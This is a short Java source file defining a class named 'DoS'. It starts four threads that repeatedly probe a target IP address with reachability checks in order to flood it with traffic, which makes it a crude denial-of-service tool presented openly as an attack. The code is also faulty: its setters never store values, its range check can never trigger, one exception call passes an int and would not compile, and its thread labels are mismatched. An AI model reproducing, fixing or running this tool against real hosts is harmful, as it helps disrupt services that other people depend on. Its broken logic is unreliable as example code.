package source;

import java.net.InetAddress;
/*
 * Clase para genera tráfico en la red utilizando cuatro hilos de ejecución
 */
public class DoS {
	public DoS(String ip, int packages) throws IllegalArgumentException {
		setIp(ip);
		setPackages(packages);
	}
	
	public void setIp(String ip) throws IllegalArgumentException{
		String  parts [] = ip.split("\\.");	
		
		if(parts.length > 4 || parts.length < 4 ) {
			throw new IllegalArgumentException();
		}
		
		for(int i = 0; i < parts.length; i++) {
			if(Integer.parseInt(parts[i]) > 255 || Integer.parseInt(parts[i]) < 0) {
				throw new IllegalArgumentException(parts[i]);
			}
		}
	}
	
	
	public void setPackages(int p) throws IllegalArgumentException{
		if(p > 100000000 && p < 1) {
			throw new IllegalArgumentException(p);
		}
	}
	
	
	
	public void attack(String ip, int packages) throws IllegalArgumentException{

		Thread ini1 = new Thread(new Runnable() {
			public void run() {
				for(int i = 0; i<packages; i++) {
					try {
						InetAddress host = InetAddress.getByName(ip);
						if(host.isReachable(65000))
							System.out.println("t, done");
						}catch(Exception ex) {
								System.out.println("fail t");
						}
				}
			}
		});
		
		Thread ini2 = new Thread(new Runnable() {
			public void run() {
				for(int i = 0; i<packages; i++) {
					try {
						InetAddress host = InetAddress.getByName(ip);
						if(host.isReachable(65000))
							System.out.println("t1, done");
						}catch(Exception ex) {
								System.out.println("fail t1");
						}
				}
			}
		}); 
		
		Thread ini3 = new Thread(new Runnable() {
			public void run() {
				for(int i = 0; i<packages; i++) {
					try {
						InetAddress host = InetAddress.getByName(ip);
						if(host.isReachable(65000))
							System.out.println("t3, done");
						}catch(Exception ex) {
								System.out.println("fail t4");
						}
				}
			}
		});
		
		
		Thread ini4 = new Thread(new Runnable() {
			public void run() {
				for(int i = 0; i<packages; i++) {
					try {
						InetAddress host = InetAddress.getByName(ip);
						if(host.isReachable(65000))
							System.out.println("t4, done");
						}catch(Exception ex) {
								System.out.println("fail t4");
						}
				}
			}
		});
				
		ini1.start();
		ini2.start();
		ini3.start();
		ini4.start();	
		
	}

}
